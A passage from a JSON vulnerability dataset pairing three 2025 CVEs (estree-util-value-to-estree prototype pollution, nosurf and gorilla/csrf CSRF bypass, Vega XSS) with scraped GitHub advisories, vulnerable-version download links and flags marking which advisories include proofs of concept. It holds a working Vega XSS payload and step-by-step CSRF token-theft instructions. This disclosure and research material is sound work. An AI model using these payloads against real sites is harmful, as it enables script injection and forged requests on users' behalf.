        "sw_version": "v3.3.2",
        "sw_version_wget": "https://github.com/remcohaszing/estree-util-value-to-estree/archive/refs/tags/v3.3.2.zip",
        "description": "estree-util-value-to-estree converts a JavaScript value to an ESTree expression. When generating an ESTree from a value with a property named __proto__, valueToEstree would generate an object that specifies a prototype instead. This vulnerability is fixed in 3.3.3.",
        "sec_adv": [
            {
                "url": "https://github.com/remcohaszing/estree-util-value-to-estree/security/advisories/GHSA-f7f6-9jq7-3rqj",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nremcohaszing\n/\nestree-util-value-to-estree\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 2\nStar 25\nCode\nIssues\nPull requests\nActions\nSecurity\n1\nInsights\nAdditional navigation options\nPrototype pollution in generated ESTree\nModerate remcohaszing published GHSA-f7f6-9jq7-3rqj on Apr 6Apr 6, 2025\nPackage\nnpm estree-util-value-to-estree\n(\nnpm\n)\nAffected versions\n<3.3.3\nPatched versions\n3.3.3\nDescription\nImpact\nWhen generating an ESTree from a value with a property named __proto__, valueToEstree would generate an object that specifies a prototype instead.\nExample:\nimport { generate } from 'astring'\nimport { valueToEstree } from 'estree-util-value-to-estree'\n\nconst estree = valueToEstree({\n  ['__proto__']: {}\n})\nconst code = generate(estree)\nconsole.log(code)\nOutput:\n{\n  \"__proto__\": {}\n}\nPatches\nThis was fixed in version 3.3.3.\nWorkarounds\nIf you control the input, don\u2019t specify a property named __proto__. If you don\u2019t control the output, strip any properties named __proto__ before passing it to valueToEstree.\nSeverity\nModerate\nCVE ID\nCVE-2025-32014\nWeaknesses\nCWE-1321\nCredits\nremcohaszing\nFinder\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The provided advisory includes a detail that mentions an example code which demonstrates the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-1321",
                "value": "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
            }
        ]
    },
    "CVE-2025-46721": {
        "published_date": "2025-05-13T15:29:30.068Z",
        "patch_commits": [],
        "sw_version": "v1.1.1",
        "sw_version_wget": "https://github.com/justinas/nosurf/archive/refs/tags/v1.1.1.zip",
        "description": "nosurf is cross-site request forgery (CSRF) protection middleware for Go. A vulnerability in versions prior to 1.2.0 allows an attacker who controls content on the target site, or on a subdomain of the target site (either via XSS, or otherwise) to bypass CSRF checks and issue requests on user's behalf. Due to misuse of the Go `net/http` library, nosurf categorizes all incoming requests as plain-text HTTP requests, in which case the `Referer` header is not checked to have the same origin as the target webpage. If the attacker has control over HTML contents on either the target website (e.g. `example.com`), or on a website hosted on a subdomain of the target (e.g. `attacker.example.com`), they will also be able to manipulate cookies set for the target website. By acquiring the secret CSRF token from the cookie, or overriding the cookie with a new token known to the attacker, `attacker.example.com` is able to craft cross-site requests to `example.com`. A patch for the issue was released in nosurf 1.2.0. In lieu of upgrading to a patched version of nosurf, users may additionally use another HTTP middleware to ensure that a non-safe HTTP request is coming from the same origin (e.g. by requiring a `Sec-Fetch-Site: same-origin` header in the request).",
        "sec_adv": [
            {
                "url": "https://github.com/justinas/nosurf/security/advisories/GHSA-w9hf-35q4-vcjw",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\njustinas\n/\nnosurf\nPublic\nNotifications You must be signed in to change notification settings\nFork 127\nStar 1.7k\nCode\nIssues\n13\nPull requests\n2\nActions\nProjects\nWiki\nSecurity\n1\nInsights\nAdditional navigation options\nCSRF due to non-functional same-origin checks in justinas/nosurf\nModerate justinas published GHSA-w9hf-35q4-vcjw 3 days agoMay 13, 2025\nPackage\ngomod github.com/justinas/nosurf\n(\nGo\n)\nAffected versions\n<= 1.1.1\nPatched versions\n1.2.0\nDescription\nImpact\nThis vulnerability allows an attacker who controls content on the target site, or on a subdomain of the target site (either via XSS, or otherwise) to bypass Cross-Site Request Forgery checks and issue requests on user's behalf.\nDetails\nDue to misuse of the Go net/http library, nosurf categorizes all incoming requests as plain-text HTTP requests, in which case the Referer header is not checked to have the same origin as the target webpage.\nIf the attacker has control over HTML contents on either the target website (e.g. example.com), or on a website hosted on a subdomain of the target (e.g. attacker.example.com), they will also be able to manipulate cookies set for the target website. By acquiring the secret CSRF token from the cookie, or overriding the cookie with a new token known to the attacker, attacker.example.com is able to craft cross-site requests to example.com.\nPatches\nA patch for the issue was released in nosurf 1.2.0.\nWorkarounds\nIn lieu of upgrading to a patched version of nosurf, users may additionally use another HTTP middleware to ensure that a non-safe HTTP request is coming from the same origin (e.g. by requiring a Sec-Fetch-Site: same-origin header in the request).\nReferences\nGHSA-rq77-p4h8-4crw\nhttps://github.com/justinas/nosurf-cve-2025-46721\nhttps://www.cve.org/CVERecord?id=CVE-2025-46721\nhttps://github.com/justinas/nosurf/releases/tag/v1.2.0\nSeverity\nModerate\n6.0\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nLow\nAttack Requirements\nPresent\nPrivileges Required\nNone\nUser interaction\nPassive\nVulnerable System Impact Metrics\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nNone\nSubsequent System Impact Metrics\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N\nCVE ID\nCVE-2025-46721\nWeaknesses\nCWE-352\nCredits\npatrickod\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The provided advisory explains the impact, cause, and resolution of the vulnerability but does not include a proof of concept or explicit reproduction steps."
            },
            {
                "url": "https://github.com/advisories/GHSA-rq77-p4h8-4crw",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nGitHub Advisory Database GitHub Reviewed CVE-2025-24358\ngorilla/csrf CSRF vulnerability due to broken Referer validation\nModerate severity GitHub Reviewed Published on Apr 13Apr 14, 2025 in gorilla/csrf \u2022 Updated 2 weeks agoMay 1, 2025\nVulnerability details\nDependabot alerts\n0\nPackage\ngomod github.com/gorilla/csrf\n(\nGo\n)\nAffected versions\n< 1.7.3\nPatched versions\n1.7.3\nDescription\nSummary\ngorilla/csrf is vulnerable to CSRF via form submission from origins that share a top level domain with the target origin.\nDetails\ngorilla/csrf does not validate the Origin header against an allowlist. Its executes its validation of the Referer header for cross-origin requests only when it believes the request is being served over TLS. It determines this by inspecting the r.URL.Scheme value. However, this value is never populated for \"server\" requests per the Go spec, and so this check does not run in practice.\n // URL specifies either the URI being requested (for server\n // requests) or the URL to access (for client requests).\n //\n // For server requests, the URL is parsed from the URI\n // supplied on the Request-Line as stored in RequestURI.  For\n // most requests, fields other than Path and RawQuery will be\n // empty. (See [RFC 7230, Section 5.3](https://rfc-editor.org/rfc/rfc7230.html#section-5.3))\n //\n // For client requests, the URL's Host specifies the server to\n // connect to, while the Request's Host field optionally\n // specifies the Host header value to send in the HTTP\n // request.\n URL *[url](https://pkg.go.dev/net/url).[URL](https://pkg.go.dev/net/url#URL)\nPoC\ncreate trusted origin target.example.test protected with gorilla/csrf and served over TLS hosting form on /submit\ncreate attacker origin attack.example.test served over TLS\nattacker exfiltrates token & cookie combination from target.example.test\nattacker sets exfiltrated cookie with domain=.example.test and path=/submit\nas the cookie has a more specific path than / (the default for CSRF cookies) it will be sent first by the browser on submit to our target origin\nsubmit form from attack.example.test with exfiltrated CSRF form token\nobserve valid form submission as attack.example.test Origin / Referer headers are not validated.\nImpact\nThis vulnerability allows an attacker who has gained XSS on a subdomain or top level domain to perform authenticated form submissions against gorilla/csrf protected targets that share the same top level domain.\nThis bug has existed in gorilla/csrf since its initial release in 2015.\nReferences\nGHSA-rq77-p4h8-4crw\ngorilla/csrf@9dd6af1\nhttps://nvd.nist.gov/vuln/detail/CVE-2025-24358\nhttps://pkg.go.dev/vuln/GO-2025-3607\nhttps://lists.debian.org/debian-lts-announce/2025/05/msg00002.html\napoorvajagtap published to gorilla/csrf on Apr 13Apr 14, 2025\nPublished to the GitHub Advisory Database on Apr 14Apr 14, 2025\nReviewed on Apr 14Apr 14, 2025\nPublished by the National Vulnerability Database on Apr 15Apr 15, 2025\nLast updated 2 weeks agoMay 1, 2025\nSeverity\nModerate\n5.4\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nLow\nAttack Requirements\nPresent\nPrivileges Required\nNone\nUser interaction\nPassive\nVulnerable System Impact Metrics\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nNone\nSubsequent System Impact Metrics\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P\nEPSS score\n0.01%\n(1st percentile)\nWeaknesses\nCWE-352\nCVE ID\nCVE-2025-24358\nGHSA ID\nGHSA-rq77-p4h8-4crw\nSource code\ngorilla/csrf\nCredits\npatrickod\nReporter\nThis advisory has been edited. See History.\nSee something to contribute? Suggest improvements for this vulnerability.\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes detailed steps under the 'PoC' section for reproducing the described vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-352",
                "value": "CWE-352: Cross-Site Request Forgery (CSRF)"
            }
        ]
    },
    "CVE-2025-25304": {
        "published_date": "2025-02-14T19:28:00.388Z",
        "patch_commits": [],
        "sw_version": "v5.25.0",
        "sw_version_wget": "https://github.com/vega/vega/archive/refs/tags/v5.25.0.zip",
        "description": "Vega is a visualization grammar, a declarative format for creating, saving, and sharing interactive visualization designs. Prior to version 5.26.0 of vega and 5.4.2 of vega-selections, the `vlSelectionTuples` function can be used to call JavaScript functions, leading to cross-site scripting.`vlSelectionTuples` calls multiple functions that can be controlled by an attacker, including one call with an attacker-controlled argument. This can be used to call `Function()` with arbitrary JavaScript and the resulting function can be called with `vlSelectionTuples` or using a type coercion to call `toString` or `valueOf`. Version 5.26.0 of vega and 5.4.2 of vega-selections fix this issue.",
        "sec_adv": [
            {
                "url": "https://github.com/vega/vega/security/advisories/GHSA-mp7w-mhcv-673j",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nvega\n/\nvega\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 1.5k\nStar 11.5k\nCode\nIssues\n446\nPull requests\n24\nDiscussions\nActions\nSecurity\n7\nInsights\nAdditional navigation options\nXSS via vlSelectionTuples function\nModerate domoritz published GHSA-mp7w-mhcv-673j on Feb 14Feb 14, 2025\nPackage\nnpm vega\n(\nnpm\n)\nAffected versions\n< v5.26.0\nPatched versions\nv5.26.0\nnpm vega-selections\n(\nnpm\n)\n< 5.4.2\n5.4.2\nDescription\nSummary\nThe vlSelectionTuples function can be used to call JavaScript functions, leading to XSS.\nDetails\nvlSelectionTuples calls multiple functions that can be controlled by an attacker, including one call with an attacker-controlled argument.\nExample call: vlSelectionTuples([{datum:<argument>}], {fields:[{getter:<function>}]})\nThis can be used to call Function() with arbitrary JavaScript and the resulting function can be called with vlSelectionTuples or using a type coercion to call toString or valueOf.\nPoC\n{\"$schema\":\"https://vega.github.io/schema/vega/v5.json\",\"signals\":[{\"name\":\"a\",\"init\":\"+{valueOf:vlSelectionTuples([{datum:'alert(1)'}],{fields:[{getter:[].at.constructor}]})[0].values[0]}\"}]}\nSeverity\nModerate\nCVE ID\nCVE-2025-25304\nWeaknesses\nCWE-79\nCredits\nFallingPineapples\nReporter\ndomoritz\nOther\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes a PoC in the form of a JSON object that exploits the vulnerability to perform a simple JavaScript alert."
            }
        ],
        "cwe": [
            {
                "id": "CWE-79",
                "value": "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
            }
        ]
    }
}